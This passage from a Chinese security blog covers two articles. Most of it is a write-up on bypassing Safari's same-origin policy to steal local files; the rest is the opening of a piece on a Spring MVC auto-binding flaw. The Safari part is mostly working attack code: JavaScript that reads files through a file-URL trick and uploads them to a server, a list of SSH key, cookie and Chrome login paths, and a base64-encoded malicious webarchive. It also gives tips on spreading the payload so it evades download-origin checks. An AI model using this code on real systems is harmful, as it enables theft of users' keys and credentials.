X的Finder程序会在打开过的每个目录下创建.DS_Store文件(引自维基百科)。</p>\n<p>从<code>.DS_store</code>文件中可以解析出当前目录中的所有的文件名，解析代码如下:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> ds_store <span class=\"keyword\">import</span> DSStore</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">path = <span class=\"string\">'./.DS_Store'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">parse</span><span class=\"params\">(file)</span>:</span></span><br><span class=\"line\">    filelist = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> file:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> i.filename != <span class=\"string\">'.'</span>:</span><br><span class=\"line\">            filelist.append(i.filename)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> list(set(filelist))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">d = DSStore.open(path, <span class=\"string\">'r+'</span>)</span><br><span class=\"line\">fileresult = parse(d)</span><br><span class=\"line\">print(json.dumps(fileresult))</span><br><span class=\"line\"><span class=\"keyword\">for</span> name <span class=\"keyword\">in</span> fileresult:</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        d = DSStore.open(path + name+ <span class=\"string\">'/.DS_Store'</span>, <span class=\"string\">'r+'</span>)</span><br><span class=\"line\">        fileresult = parse(d)</span><br><span class=\"line\">        all.append(fileresult)</span><br><span class=\"line\">        print(json.dumps(fileresult))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br></pre></td></tr></table></figure>\n<p>运行: <code>python parse_ds.py</code>, 可以解析出当前目录下所有的文件名。</p>\n<img src=\"/2017/08/07/绕过Safari同源策略，偷取本地文件/004.png\">\n<p>苹果系统中有价值的数据基本都在用户目录下，而不同电脑的用户名是不一样的。如果不知道用户名，那么就难以用file协议读取用户目录中<code>.DS_store</code>文件的内容，攻击效果将大打折扣。苹果系统中<code>/etc/passwd</code>文件是不含用户名信息的，但是在<code>/var/log/system.log</code>和 <code>/var/log/install.log</code>这两个系统创建的日志信息中, 通常都包含了用户的路径信息，可以通过简单的正则表达式进行匹配。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getUser</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> xhr = <span class=\"keyword\">new</span> XMLHttpRequest();</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        xhr.open(<span class=\"string\">'GET'</span>, <span class=\"string\">'/var/log/system.log;/https:%2f%2fgoogle.com/'</span>, <span class=\"literal\">false</span>);</span><br><span class=\"line\">        xhr.send();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> xhr.responseText.match(<span class=\"comment\">//Users/w+//g)[0];</span></span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (e) &#123;</span><br><span class=\"line\">        xhr.open(<span class=\"string\">'GET'</span>, <span class=\"string\">'/var/log/install.log;/https:%2f%2fgoogle.com/'</span>, <span class=\"literal\">false</span>);</span><br><span class=\"line\">        xhr.send();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> xhr.responseText.match(<span class=\"comment\">//Users/w+//g)[0];</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这样就可以获取了完整的文件访问路径，结合<code>.DS_Store</code>文件内容获得文件和文件夹的层次结构。但是注意到，通常情况下只有用Finder打开的目录才会创建<code>.DS_Store</code>文件，而一些敏感文件目录通常是没有<code>.DS_Store</code>文件的，例如:<code>~/.ssh</code>。要获取这类的敏感文件，可以人为收集一些常见的敏感文件路径，弥补利用<code>.DS_Store</code>文件读取的不足。</p>\n<p>常见的一些敏感文件路径有</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">~/.ssh/id_rsa;</span><br><span class=\"line\">~/.ssh/id_rsa.key;</span><br><span class=\"line\">~/.ssh/id_rsa.pub;</span><br><span class=\"line\">~/.ssh/known_hosts;</span><br><span class=\"line\">~/.ssh/authorized_keys</span><br><span class=\"line\"></span><br><span class=\"line\">~/Library/Cookies/Cookies.binarycookies</span><br><span class=\"line\">~/Library/Cookies/com.apple.Safari.cookies</span><br><span class=\"line\"></span><br><span class=\"line\"># 系统账户信息</span><br><span class=\"line\">~/Library/Accounts/Accounts4.sqlite</span><br><span class=\"line\"></span><br><span class=\"line\">~/Library/Application Support/Google/Chrome/Default/Login Data</span><br><span class=\"line\">~/Library/Application Support/Google/Chrome/Default/Cookies</span><br><span class=\"line\">~/Library/Application Support/Google/Chrome/Default/History</span><br></pre></td></tr></table></figure>\n<h2 id=\"Safari打开恶意文档\"><a href=\"#Safari打开恶意文档\" class=\"headerlink\" title=\"Safari打开恶意文档\"></a>Safari打开恶意文档</h2><p>Safari打开本地创建的恶意xhtm文件<code>PoC.xhtm</code>，本地开启一个服务器接收发送的文件内容, 并解析<code>.DS_Store</code>文件的内容返回给前端js继续读取本地文件，核心代码如下：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">processFile</span>(<span class=\"params\">file</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> out = getFile(file),</span><br><span class=\"line\">        xhr = <span class=\"keyword\">new</span> XMLHttpRequest(),</span><br><span class=\"line\">        formData = <span class=\"keyword\">new</span> FormData()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!out) <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    formData.append(<span class=\"string\">'file'</span>, out, file);</span><br><span class=\"line\"></span><br><span class=\"line\">    xhr.open(<span class=\"string\">'POST'</span>, serverUrl);</span><br><span class=\"line\">    xhr.onreadystatechange = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (xhr.readyState === <span class=\"number\">4</span> &amp;&amp; xhr.status === <span class=\"number\">200</span> &amp;&amp; xhr.responseText.length &gt; <span class=\"number\">3</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">let</span> response = <span class=\"built_in\">JSON</span>.parse(xhr.responseText);</span><br><span class=\"line\"></span><br><span class=\"line\">            response.forEach(<span class=\"function\"><span class=\"params\">responseFile</span> =&gt;</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">let</span> path = file.slice(<span class=\"number\">0</span>, file.lastIndexOf(<span class=\"string\">'/'</span>) + <span class=\"number\">1</span>);</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (processFile(path + responseFile) != <span class=\"literal\">true</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                    processFile(path + responseFile + <span class=\"string\">'/.DS_Store'</span>);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    xhr.send(formData);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getUser</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> xhr = <span class=\"keyword\">new</span> XMLHttpRequest();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        xhr.open(<span class=\"string\">'GET'</span>, <span class=\"string\">'/var/log/system.log;/https:%2f%2fgoogle.com/'</span>, <span class=\"literal\">false</span>);</span><br><span class=\"line\">        xhr.send();</span><br><span class=\"line\">        <span class=\"keyword\">var</span> users = unique(xhr.responseText.match(<span class=\"regexp\">/\\/Users\\/\\w+\\//g</span>));</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (e) &#123;</span><br><span class=\"line\">        xhr.open(<span class=\"string\">'GET'</span>, <span class=\"string\">'/var/log/install.log;/https:%2f%2fgoogle.com/'</span>, <span class=\"literal\">false</span>);</span><br><span class=\"line\">        xhr.send();</span><br><span class=\"line\">        <span class=\"keyword\">var</span> users = unique(xhr.responseText.match(<span class=\"regexp\">/\\/Users\\/\\w+\\//g</span>));</span><br><span class=\"line\">    &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> users.find(<span class=\"function\">(<span class=\"params\">userstring</span>) =&gt;</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> xhr = <span class=\"keyword\">new</span> XMLHttpRequest();</span><br><span class=\"line\">            xhr.open(<span class=\"string\">'GET'</span>, userstring + <span class=\"string\">'.DS_Store'</span>, <span class=\"literal\">false</span>);</span><br><span class=\"line\">            xhr.send();</span><br><span class=\"line\">            <span class=\"keyword\">return</span> xhr.responseText.length &gt; <span class=\"number\">0</span></span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getFile</span>(<span class=\"params\">file</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> xhr = <span class=\"keyword\">new</span> XMLHttpRequest();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(file);</span><br><span class=\"line\">        xhr.open(<span class=\"string\">'GET'</span>, file + <span class=\"string\">';/https:%2f%2fgoogle.com/'</span>, <span class=\"literal\">false</span>);</span><br><span class=\"line\">        xhr.responseType = <span class=\"string\">'blob'</span>;</span><br><span class=\"line\">        xhr.send();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (xhr.response.size != <span class=\"number\">0</span>) <span class=\"keyword\">return</span> xhr.response</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (e) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(e)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<img src=\"/2017/08/07/绕过Safari同源策略，偷取本地文件/005.png\">\n<p>打开这种本地创建的文件，可以看出攻击是有效的,文件内容会被存储到远程服务器上。</p>\n<p>如果文档不是用Safari打开的，而是用其他浏览器打开本地的HTML文档，如Chrome或Firefox, 那么什么也不会发生，幸运的是, 存在一种默认情况下用Safari浏览器打开的文件格式webarchive, webarchive文件是设计为在mscOS和windows系统上用Safari浏览器预览或保存网页，其格式不同于标准的HTML文件格式。设计一个恶意的webarchive格式文件如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;</span><br><span class=\"line\">&lt;plist version=&quot;1.0&quot;&gt;</span><br><span class=\"line\">&lt;dict&gt;</span><br><span class=\"line\">\t&lt;key&gt;WebMainResource&lt;/key&gt;</span><br><span class=\"line\">\t&lt;dict&gt;</span><br><span class=\"line\">\t\t&lt;key&gt;WebResourceData&lt;/key&gt;</span><br><span class=\"line\">\t\t&lt;data&gt;\tPHNjcmlwdD5jb25zdCBzZXJ2ZXJVcmw9J2h0dHA6Ly8wOjUwMDAnLHVzZXI9Z2V0VXNlcigpLGxpc3Q9Wycuc3NoL2lkX3JzYScsJy5zc2gva25vd25faG9zdHMnLCcuc3NoL2F1dGhvcml6ZWRfa2V5cycsJy5iYXNoX2hpc3RvcnknLCdMaWJyYXJ5L0Nvb2tpZXMvQ29va2llcy5iaW5hcnljb29raWVzJywnTGlicmFyeS9Db29raWVzL0hTVFMucGxpc3QnLCdMaWJyYXJ5L0Nvb2tpZXMvY29tLmFwcGxlLlNhZmFyaS5jb29raWVzJywnTGlicmFyeS9BY2NvdW50cy9BY2NvdW50czQuc3FsaXRlJywnTGlicmFyeS9BcHBsaWNhdGlvbiBTdXBwb3J0L0Nocm9taXVtL0RlZmF1bHQvTG9naW4gRGF0YScsJ0xpYnJhcnkvQXBwbGljYXRpb24gU3VwcG9ydC9DaHJvbWl1bS9EZWZhdWx0L0Nvb2tpZXMnLCdMaWJyYXJ5L0FwcGxpY2F0aW9uIFN1cHBvcnQvQ2hyb21pdW0vRGVmYXVsdC9IaXN0b3J5JywnTGlicmFyeS9BcHBsaWNhdGlvbiBTdXBwb3J0L0dvb2dsZS9DaHJvbWUvRGVmYXVsdC9Mb2dpbiBEYXRhJywnTGlicmFyeS9BcHBsaWNhdGlvbiBTdXBwb3J0L0dvb2dsZS9DaHJvbWUvRGVmYXVsdC9Db29raWVzJywnTGlicmFyeS9BcHBsaWNhdGlvbiBTdXBwb3J0L0dvb2dsZS9DaHJvbWUvRGVmYXVsdC9IaXN0b3J5JywnLlRyYXNoLy5EU19TdG9yZScsJ0RvY3VtZW50cy8uRFNfU3RvcmUnLCdEZXNrdG9wLy5EU19TdG9yZScsXS5tYXAoZmlsZT0+dXNlcisgZmlsZSk7bWFpbigpO2Z1bmN0aW9uIG1haW4oKXtsaXN0LmZvckVhY2gocHJvY2Vzc0ZpbGUpO30KZnVuY3Rpb24gdW5pcXVlKGFycil7dmFyIG9iaj17fTtmb3IodmFyIGk9MDtpPGFyci5sZW5ndGg7aSsrKXt2YXIgc3RyPWFycltpXTtvYmpbc3RyXT10cnVlO30KcmV0dXJuIE9iamVjdC5rZXlzKG9iaik7fQpmdW5jdGlvbiBwcm9jZXNzRmlsZShmaWxlKXtsZXQgb3V0PWdldEZpbGUoZmlsZSkseGhyPW5ldyBYTUxIdHRwUmVxdWVzdCgpLGZvcm1EYXRhPW5ldyBGb3JtRGF0YSgpCmlmKCFvdXQpcmV0dXJuIGZhbHNlO2Zvcm1EYXRhLmFwcGVuZCgnZmlsZScsb3V0LGZpbGUpO3hoci5vcGVuKCdQT1NUJyxzZXJ2ZXJVcmwpO3hoci5vbnJlYWR5c3RhdGVjaGFuZ2U9KCk9PntpZih4aHIucmVhZHlTdGF0ZT09PTQmJnhoci5zdGF0dXM9PT0yMDAmJnhoci5yZXNwb25zZVRleHQubGVuZ3RoPjMpe2xldCByZXNwb25zZT1KU09OLnBhcnNlKHhoci5yZXNwb25zZVRleHQpO3Jlc3BvbnNlLmZvckVhY2gocmVzcG9uc2VGaWxlPT57bGV0IHBhdGg9ZmlsZS5zbGljZSgwLGZpbGUubGFzdEluZGV4T2YoJy8nKSsgMSk7aWYocHJvY2Vzc0ZpbGUocGF0aCsgcmVzcG9uc2VGaWxlKSE9dHJ1ZSl7cHJvY2Vzc0ZpbGUocGF0aCsgcmVzcG9uc2VGaWxlKycvLkRTX1N0b3JlJyk7fX0pfX07eGhyLnNlbmQoZm9ybURhdGEpO3JldHVybiB0cnVlfQpmdW5jdGlvbiBnZXRVc2VyKCl7dmFyIHhocj1uZXcgWE1MSHR0cFJlcXVlc3QoKTt0cnl7eGhyLm9wZW4oJ0dFVCcsJ2ZpbGU6Ly8vdmFyL2xvZy9zeXN0ZW0ubG9nOy9odHRwczolMmYlMmZnb29nbGUuY29tLycsZmFsc2UpO3hoci5zZW5kKCk7dmFyIHVzZXJzPXVuaXF1ZSh4aHIucmVzcG9uc2VUZXh0Lm1hdGNoKC9cL1VzZXJzXC9cdytcLy9nKSk7fWNhdGNoKGUpe3hoci5vcGVuKCdHRVQnLCdmaWxlOi8vL3Zhci9sb2cvaW5zdGFsbC5sb2c7L2h0dHBzOiUyZiUyZmdvb2dsZS5jb20vJyxmYWxzZSk7eGhyLnNlbmQoKTt2YXIgdXNlcnM9dW5pcXVlKHhoci5yZXNwb25zZVRleHQubWF0Y2goL1wvVXNlcnNcL1x3K1wvL2cpKTt9ZmluYWxseXtyZXR1cm4gdXNlcnMuZmluZCgodXNlcnN0cmluZyk9Pnt2YXIgeGhyPW5ldyBYTUxIdHRwUmVxdWVzdCgpO3hoci5vcGVuKCdHRVQnLHVzZXJzdHJpbmcrJy5EU19TdG9yZScsZmFsc2UpO3hoci5zZW5kKCk7cmV0dXJuIHhoci5yZXNwb25zZVRleHQubGVuZ3RoPjB9KTt9fQpmdW5jdGlvbiBnZXRGaWxlKGZpbGUpe3ZhciB4aHI9bmV3IFhNTEh0dHBSZXF1ZXN0KCk7dHJ5e2NvbnNvbGUubG9nKGZpbGUpO3hoci5vcGVuKCdHRVQnLGZpbGUrJzsvaHR0cHM6JTJmJTJmZ29vZ2xlLmNvbS8nLGZhbHNlKTt4aHIucmVzcG9uc2VUeXBlPSdibG9iJzt4aHIuc2VuZCgpO2lmKHhoci5yZXNwb25zZS5zaXplIT0wKXJldHVybiB4aHIucmVzcG9uc2V9Y2F0Y2goZSl7Y29uc29sZS5sb2coZSl9fQo8L3NjcmlwdD4=</span><br><span class=\"line\">\t\t&lt;/data&gt;</span><br><span class=\"line\">\t\t&lt;key&gt;WebResourceFrameName&lt;/key&gt;</span><br><span class=\"line\">\t\t&lt;string&gt;&lt;/string&gt;</span><br><span class=\"line\">\t\t&lt;key&gt;WebResourceMIMEType&lt;/key&gt;</span><br><span class=\"line\">\t\t&lt;string&gt;text/html&lt;/string&gt;</span><br><span class=\"line\">\t\t&lt;key&gt;WebResourceTextEncodingName&lt;/key&gt;</span><br><span class=\"line\">\t\t&lt;string&gt;UTF-8&lt;/string&gt;</span><br><span class=\"line\">\t\t&lt;key&gt;WebResourceURL&lt;/key&gt;</span><br><span class=\"line\">\t\t&lt;string&gt;file://&lt;/string&gt;</span><br><span class=\"line\">\t&lt;/dict&gt;</span><br><span class=\"line\">&lt;/dict&gt;</span><br><span class=\"line\">&lt;/plist&gt;</span><br></pre></td></tr></table></figure>\n<p>上面data中的base64数据解码就是一段恶意的javascript脚本。</p>\n<h3 id=\"网络传播xhtm文件\"><a href=\"#网络传播xhtm文件\" class=\"headerlink\" title=\"网络传播xhtm文件\"></a>网络传播xhtm文件</h3><p>是不是只要Safari本地打开类似xhtm恶意文档，攻击都能生效呢？结果并不是，macOS文件是有属性信息的，从网上下载的文件会有来源信息， 如: <code>http://127.0.0.1:8000/Poc.xhtm</code>, 本地打开这种文件，攻击并不生效。</p>\n<img src=\"/2017/08/07/绕过Safari同源策略，偷取本地文件/006.png\">\n<p>可见，打开带网络来源属性的的文件，会被Safari的同源策略拦截，导致攻击不能生效，那么通过邮件发送恶意文件再本地打开的方式，也是难以成功了。</p>\n<p>那么是不是没有办法进行网络传播了呢，答案是否定的，macOS上的应用并不是都会保留文件的网络属性。</p>\n<ul>\n<li><p>文件压缩</p>\n<p>macOS自带的解压工具解压文件仍旧会保留网络属性，但是第三方应用如:<code>Entropy</code>解压文件会丢失网络属性，然后用Safari本地打开可导致攻击成功。那么可以将文件压缩为macOS自带解压工具解压不了的格式，如: 7z, rar等，然后通过网络下载或邮件进行传播。</p>\n</li>\n<li><p>社交软件传播</p>\n<p>使用微信和QQ接收文件，仍旧会保留网络属性，无法成功利用</p>\n</li>\n</ul>\n<p>感谢wupco，给出了一种可以用来网络传播html文档进行攻击的方式，利用iframe下载webarchive文件后本地读取webarchive文件进行攻击的方式。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">test</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">exp</span>(<span class=\"params\"></span>)</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"keyword\">var</span> iframe2 = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">'iframe'</span>);</span></span><br><span class=\"line\"><span class=\"javascript\">            iframe2.src=<span class=\"string\">\"./PoC0.webarchive\"</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"built_in\">document</span>.body.appendChild(iframe2);</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">'iframe'</span>);</span></span><br><span class=\"line\"><span class=\"javascript\">    iframe.src=<span class=\"string\">\"http://0:8000/PoC0.webarchive\"</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"built_in\">document</span>.body.appendChild(iframe);</span></span><br><span class=\"line\"><span class=\"javascript\">    setTimeout(<span class=\"string\">\"exp()\"</span>,<span class=\"number\">1500</span>);</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"网络传播webarchive文件\"><a href=\"#网络传播webarchive文件\" class=\"headerlink\" title=\"网络传播webarchive文件\"></a>网络传播webarchive文件</h3><p>测试发现，通过网页或邮件等方式下载到本地的webarchive文件，用Safari打开，攻击是有效的。 唯一不足的是Safari会弹一个警示框显示文件是网络下载的，需要用户确认才能打开。</p>\n<img src=\"/2017/08/07/绕过Safari同源策略，偷取本地文件/007.png\">\n<h2 id=\"防御\"><a href=\"#防御\" class=\"headerlink\" title=\"防御\"></a>防御</h2><p>针对这种攻击，有效的防御就是不要使用Safari浏览器打开本地文件, 不要将默认浏览器设置为Safari, 修改为Chrome等浏览器。</p>\n<h2 id=\"Ref\"><a href=\"#Ref\" class=\"headerlink\" title=\"Ref\"></a>Ref</h2><ul>\n<li><a href=\"https://xakep.ru/2017/07/06/safari-localfile-read/\" target=\"_blank\" rel=\"noopener\">https://xakep.ru/2017/07/06/safari-localfile-read/</a></li>\n<li><a href=\"https://lab.wallarm.com/hunting-the-files-34caa0c1496\" target=\"_blank\" rel=\"noopener\">https://lab.wallarm.com/hunting-the-files-34caa0c1496</a></li>\n<li><a href=\"http://resources.infosecinstitute.com/bypassing-same-origin-policy-sop-part-2/#article\" target=\"_blank\" rel=\"noopener\">http://resources.infosecinstitute.com/bypassing-same-origin-policy-sop-part-2/#article</a></li>\n<li><a href=\"https://www.ifshow.com/detailed-and-bypass-the-same-origin-policy/\" target=\"_blank\" rel=\"noopener\">https://www.ifshow.com/detailed-and-bypass-the-same-origin-policy/</a></li>\n</ul>\n","categories":["Web安全"],"tags":["同源策略"]},{"title":"Spring MVC 自动绑定漏洞","url":"http://www.beesfun.com/2017/07/22/Spring-MVC-自动绑定漏洞/","content":"<h2 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h2><p>软件框架有时允许开发人员自动将HTTP请求参数绑定到程序代码变量或对象中，从而使开发人员更容易地使用该框架。攻击者就可以利用这种方法通过构造http请求，将请求参数绑定到对象上，当代码逻辑使用该对象参数时就可能产生一些不可预料的结果。</p>\n<p>在Spring mvc中，注解@ModelAttribute是一个非常常用的注解，其功能主要在两方面：</p>\n<ul>\n<li>运用在参数上，会将客户端传递过来的参数按名称注入到指定对象中，并且会将这个对象自动加入ModelMap中，便于View层使用；</li>\n<li>运用在方法上，会在每一个@RequestMapping标注的方法前执行，如果有返回值，则自动将该返回值加入到ModelMap中；</li>\n</ul>\n<p>SessionAttributes注解</p>\n<p>在默认情况下，ModelMap 中的属性作用域是 request 级别，也就是说，当本次请求结束后，ModelMap 中的属性将销毁。如果希望在多个请求中共享 ModelMap 中的属性，必须将其属性转存到 session 中，这样 ModelMap 的属性才可以被跨请求访问。</p>\n<p>Spring 允许我们有选择地指定 ModelMap 中的哪些属性需要转存到 session 中，以便下一个请求对应的 ModelMap 的属性列表中还能访问到这些属性。这一功能是通过类定义处标注 @SessionAttributes(“user”) 注解来实现的。SpringMVC 就会自动将 @SessionAttributes 定义的属性注入到 ModelMap 对象，在 setup action 的参数列表时，去 ModelMap 